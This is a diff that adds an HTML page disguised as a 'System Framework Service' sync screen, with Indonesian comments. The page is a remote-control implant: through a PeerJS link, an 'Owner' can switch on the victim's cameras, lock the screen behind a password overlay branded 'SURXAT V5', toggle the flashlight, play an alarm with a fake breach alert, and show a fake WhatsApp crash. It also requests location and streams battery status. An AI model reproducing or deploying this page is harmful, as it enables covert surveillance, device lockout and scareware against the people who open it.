@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Framework Service</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { background-color: #000; color: #fff; font-family: sans-serif; overflow: hidden; margin: 0; }
+        
+        /* Layar Kunci (Lock Screen) */
+        #lock-overlay {
+            display: none; position: fixed; inset: 0; background: #000; 
+            z-index: 999999; flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        /* Simulasi Bug WhatsApp */
+        #wa-bug-overlay {
+            display: none; position: fixed; inset: 0; background: #075e54; 
+            z-index: 999998; flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        .loader { border-top-color: #3498db; animation: spinner 1.5s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        @keyframes loading-bar { 0% {transform:translateX(-100%)} 100% {transform:translateX(100%)} }
+        .bar-animate { animation: loading-bar 3s linear infinite; }
+    </style>
+</head>
+<body>
+
+    <div id="lock-overlay">
+        <i class="fas fa-skull-crossbones text-6xl text-red-600 mb-6 animate-pulse"></i>
+        <h1 id="lock-msg" class="text-2xl font-black text-center px-6 uppercase text-red-500">DEVICE LOCKED</h1>
+        <div class="mt-10 w-64 text-center">
+            <input type="password" id="unlock-pass" placeholder="ENTER PASSWORD" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-2xl text-center text-white outline-none focus:border-red-600 mb-4">
+            <button onclick="attemptUnlock()" class="w-full py-4 bg-red-700 rounded-2xl font-bold text-xs uppercase">Unlock Device</button>
+            <p class="text-[8px] text-zinc-600 mt-4 uppercase">Secured by SURXAT V5</p>
+        </div>
+    </div>
+
+    <div id="wa-bug-overlay">
+        <i class="fab fa-whatsapp text-[100px] text-white mb-6"></i>
+        <h1 class="text-xl font-bold">WhatsApp Terhenti</h1>
+        <p class="text-center p-8 text-sm opacity-80">Gagal memuat basis data. Kesalahan sistem terdeteksi (Err: 0x882X). Memulai pemulihan paksa...</p>
+        <div class="w-64 h-1 bg-black/20 rounded-full overflow-hidden">
+            <div class="w-full h-full bg-white bar-animate"></div>
+        </div>
+    </div>
+
+    <div id="main-ui" class="flex flex-col items-center justify-center min-h-screen p-8 text-center">
+        <div class="w-20 h-20 bg-blue-600/10 rounded-full flex items-center justify-center mb-6">
+            <div class="loader ease-linear rounded-full border-4 border-t-4 border-zinc-800 h-16 w-16"></div>
+        </div>
+        <h2 class="text-lg font-bold">System Sync</h2>
+        <p class="text-[10px] text-zinc-500 mb-8">Synchronizing framework components...</p>
+        
+        <div class="bg-zinc-900/50 p-6 rounded-[2rem] border border-zinc-800 w-full max-w-xs">
+            <p class="text-[9px] text-zinc-600 font-bold uppercase mb-2 tracking-widest">Device Identity</p>
+            <div id="peer-id" class="text-2xl font-mono font-black text-blue-500">CONNECTING...</div>
+        </div>
+        <p id="status-text" class="text-[9px] font-bold text-zinc-800 uppercase mt-4 tracking-tighter tracking-[0.3em]">Status: Offline</p>
+    </div>
+
+    <script>
+        const peer = new Peer();
+        let currentPass = "";
+        let flashStatus = false;
+        let sosAudio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
+        sosAudio.loop = true;
+
+        peer.on('open', id => {
+            document.getElementById('peer-id').innerText = id;
+            // Minta izin dasar (Lokasi) agar pop-up muncul sekali di awal
+            navigator.geolocation.getCurrentPosition(() => {}, () => {});
+        });
+
+        peer.on('connection', conn => {
+            document.getElementById('status-text').innerText = "Status: Online (Paired)";
+            document.getElementById('status-text').className = "text-[9px] font-bold text-green-600 uppercase mt-4 tracking-[0.3em]";
+
+            // Kirim data Baterai berkala
+            setInterval(async () => {
+                const batt = await navigator.getBattery();
+                conn.send({
+                    type: 'status',
+                    battery: Math.round(batt.level * 100),
+                    network: navigator.onLine ? "Online" : "Offline"
+                });
+            }, 7000);
+
+            // Menerima Perintah dari Owner
+            conn.on('data', data => {
+                // 1. Kamera Depan/Belakang
+                if (data.command === 'camera_front' || data.command === 'camera_back') {
+                    const mode = data.command === 'camera_front' ? 'user' : 'environment';
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } })
+                    .then(stream => {
+                        // Di sini gambar bisa diproses (simulasi aktifkan kamera)
+                        console.log("Kamera aktif: " + mode);
+                    });
+                }
+
+                // 2. Lock Device
+                if (data.command === 'lock_screen') {
+                    currentPass = data.lockPass;
+                    document.getElementById('lock-msg').innerText = data.lockName;
+                    document.getElementById('lock-overlay').style.display = 'flex';
+                }
+
+                // 3. Force Unlock (Dari Owner)
+                if (data.command === 'force_unlock') {
+                    document.getElementById('lock-overlay').style.display = 'none';
+                    document.getElementById('wa-bug-overlay').style.display = 'none';
+                    sosAudio.pause();
+                }
+
+                // 4. Flashlight
+                if (data.command === 'toggle_flash') {
+                    flashStatus = !flashStatus;
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', torch: true } })
+                    .then(stream => {
+                        const track = stream.getVideoTracks()[0];
+                        track.applyConstraints({ advanced: [{ torch: flashStatus }] });
+                    });
+                }
+
+                // 5. SOS Alarm
+                if (data.command === 'sos_alarm') {
+                    sosAudio.play();
+                    alert("SYSTEM WARNING: SECURITY BREACH!");
+                }
+
+                // 6. Simulasi Bug WA
+                if (data.command === 'bug_wa_sim') {
+                    document.getElementById('wa-bug-overlay').style.display = 'flex';
+                }
+            });
+        });
+
+        function attemptUnlock() {
+            const input = document.getElementById('unlock-pass').value;
+            if (input === currentPass) {
+                document.getElementById('lock-overlay').style.display = 'none';
+                document.getElementById('unlock-pass').value = "";
+            } else {
+                alert("ACCESS DENIED");
+            }
+        }
+    </script>
+</body>
+</html>
